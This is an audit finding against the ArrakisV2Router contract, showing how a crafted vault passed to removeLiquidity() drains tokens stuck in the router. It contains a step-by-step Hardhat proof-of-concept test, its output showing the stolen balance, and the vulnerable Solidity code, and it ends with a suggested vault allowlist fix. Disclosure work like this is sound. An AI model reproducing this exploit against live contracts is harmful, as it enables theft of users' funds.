0xbepresent

high

# A malicious vault can be used in the ArrakisV2Router.removeLiquidity() function to steal tokens that are in the `ArrakisV2Router` balance

## Summary

A malicious vault crafted by an attacker can be used in the [ArrakisV2Router.removeLiquidity()](https://github.com/sherlock-audit/2023-06-arrakis/blob/main/v2-periphery/contracts/ArrakisV2Router.sol#L201) function to steal tokens that are in the [ArrakisV2Router](https://github.com/sherlock-audit/2023-06-arrakis/blob/main/v2-periphery/contracts/ArrakisV2Router.sol#L201) balance.

## Vulnerability Detail

The [ArrakisV2Router.removeLiquidity()](https://github.com/sherlock-audit/2023-06-arrakis/blob/main/v2-periphery/contracts/ArrakisV2Router.sol#L201) function can be called with a custom `vault` parameter.

The problem here is that the `removeLiquidity()` function can be called with a malicious vault crafted by an attacker so the attacker can try to steal tokens that are in the Router balance.

I created the next test. Test steps:

1. Someone accidentally send 10 DAI to the Router contract.
2. Attacker mints 10 malicious vault tokens.
3. Attacker calls the removeLiquidity() function and he set his malicious vault instead of valid ArrakisV2 vault.
4. Now the attacker has the token0 (DAI) which was send accidentally to the router contract in the step 1.

```javascript
// yarn test --grep "0xbepresent_remove_dai"
  it("0xbepresent_remove_dai : add liquidity and attacker remove it via a malicious vault contract", async function () {
    //
    // 1. Someone accidentally send 10 DAI to the Router contract
    // 2. Attacker mints 10 malicious vault tokens
    // 3. Attacker calls the removeLiquidity() function and he set his malicious vault instead of the original vault
    // 4. Now the attacker has the token0 which was send accidentally to the router contract in the step 2
    //
    const token1Address = await vault.token1();
    expect(token1Address.toLowerCase()).to.equal(addresses.WETH.toLowerCase());
    //
    // 1. Someone accidentally send DAI to the Router contract
    //
    let amountToRouter = ethers.utils.parseEther("10");
    console.log("\nSomeone accidentally send", amountToRouter.toString(), "token0 to the router...");
    await token0.connect(wallet).transfer(router.address, amountToRouter);
    let routerBalance0 = await token0.balanceOf(router.address);
    let attackerMaliciousVaultBalance = await token0.balanceOf(attackerAddress);
    console.log("\nRouter and attacker balances before the removeLiquidity() execution...");
    console.log("Router token0 balance            :", routerBalance0.toString());
    console.log("Attacker receiver token0 balance :", attackerMaliciousVaultBalance.toString());
    //
    // 2. Attacker mints 10 malicious vault tokens
    //
    let amountMintMaliciousVault = ethers.utils.parseEther("10"); // 10 ether
    maliciousVault.connect(walletAttacker).mint(amountMintMaliciousVault, attackerAddress);
    //
    // 3. Attacker calls the removeLiquidity() function and he set his malicious vault instead of the original vault
    //
    // Approve malicious vault to router address
    await maliciousVault.connect(walletAttacker).approve(router.address, amountMintMaliciousVault);
    // Setting malicious vault
    const removeLiquidity = {
      vault: maliciousVault.address, // maliciousVault
      burnAmount: amountMintMaliciousVault,
      amount0Min: 0,
      amount1Min: 0,
      receiver: attackerAddress,
      receiveETH: true,
      gauge: "0x0000000000000000000000000000000000000000",
    };
    await router.connect(walletAttacker).removeLiquidity(removeLiquidity);
    //
    // 4. Now the attacker has the token0 which was send accidentally to the router contract in the step 1
    //
    routerBalance0 = await token0.balanceOf(router.address);
    attackerMaliciousVaultBalance = await token0.balanceOf(attackerAddress);
    console.log("\nRouter and attacker balances after the removeLiquidity() execution...");
    console.log("Router token0 balance            :", routerBalance0.toString());
    console.log("Attacker receiver token0 balance :", attackerMaliciousVaultBalance.toString());
  });
```

Test Output:
```bash
  ArrakisV2Router tests on DAI/WETH vault

Someone accidentally send 10000000000000000000 token0 to the router...

Router and attacker balances before the removeLiquidity() execution...
Router token0 balance            : 10000000000000000000
Attacker receiver token0 balance : 0

Router and attacker balances after the removeLiquidity() execution...
Router token0 balance            : 0
Attacker receiver token0 balance : 10000000000000000000
    ✓ 0xbepresent_remove_dai : add liquidity and attacker remove it via a malicious vault contract
```

As you can see, the Router token0 balance (10000000000000000000) is transferred to the attacker token0 balance.

In the next private gist, it can be found the [MaliciousArrakisV2.sol](https://gist.github.com/0xbepresent/5f8680b2288d0786970d8f20b6ed5532#file-maliciousarrakisv2-sol) (Malicious vault) and the [ArrakisV2RouterDaiWeth.test.ts](https://gist.github.com/0xbepresent/5f8680b2288d0786970d8f20b6ed5532#file-arrakisv2routerdaiweth-test-ts) files.

## Impact

An attacker can use a `malicious vault` creafted by an attacker to steal tokens that are in the `Router balance`. The router may have tokens that are accidentally sent by mistake or with and incorrectly configured vault.

## Code Snippet

The [ArrakisV2Router._removeLiquidity()](https://github.com/sherlock-audit/2023-06-arrakis/blob/main/v2-periphery/contracts/ArrakisV2Router.sol#L536) function:

```solidity
File: ArrakisV2Router.sol
536:     function _removeLiquidity(RemoveLiquidityData memory removeData_)
537:         internal
538:         returns (uint256 amount0, uint256 amount1)
539:     {
540:         if (removeData_.receiveETH) {
541:             (amount0, amount1) = IArrakisV2(removeData_.vault).burn(
542:                 removeData_.burnAmount,
543:                 address(this)
544:             );
545:         } else {
546:             (amount0, amount1) = IArrakisV2(removeData_.vault).burn(
547:                 removeData_.burnAmount,
548:                 removeData_.receiver
549:             );
550:         }
551: 
552:         require(
553:             amount0 >= removeData_.amount0Min &&
554:                 amount1 >= removeData_.amount1Min,
555:             "received below minimum"
556:         );
557: 
558:         if (removeData_.receiveETH) {
559:             _receiveETH(
560:                 IArrakisV2(removeData_.vault),
561:                 amount0,
562:                 amount1,
563:                 removeData_.receiver
564:             );
565:         }
566:     }
```

The [ArrakisV2Router._receiveETH()](https://github.com/sherlock-audit/2023-06-arrakis/blob/main/v2-periphery/contracts/ArrakisV2Router.sol#L706) function:

```solidity
File: ArrakisV2Router.sol
706:     function _receiveETH(
707:         IArrakisV2 vault_,
708:         uint256 amount0_,
709:         uint256 amount1_,
710:         address payable receiver_
711:     ) internal {
712:         IERC20 token0 = vault_.token0();
713:         IERC20 token1 = vault_.token1();
714:         bool wethToken0 = _isToken0Weth(address(token0), address(token1));
715:         if (wethToken0) {
716:             if (amount0_ > 0) {
717:                 weth.withdraw(amount0_);
718:                 receiver_.sendValue(amount0_);
719:             }
720:             if (amount1_ > 0) {
721:                 token1.safeTransfer(receiver_, amount1_);
722:             }
723:         } else {
724:             if (amount1_ > 0) {
725:                 weth.withdraw(amount1_);
726:                 receiver_.sendValue(amount1_);
727:             }
728:             if (amount0_ > 0) {
729:                 token0.safeTransfer(receiver_, amount0_);
730:             }
731:         }
732:     }
```

## Tool used

Manual review

## Recommendation

Not sure what would be the best solution. One solution is to save the `authorized vaults` to interact and validates them in the [_addLiquidity()](https://github.com/sherlock-audit/2023-06-arrakis/blob/main/v2-periphery/contracts/ArrakisV2Router.sol#L399) and [_removeLiquidity()](https://github.com/sherlock-audit/2023-06-arrakis/blob/main/v2-periphery/contracts/ArrakisV2Router.sol#L536) functions.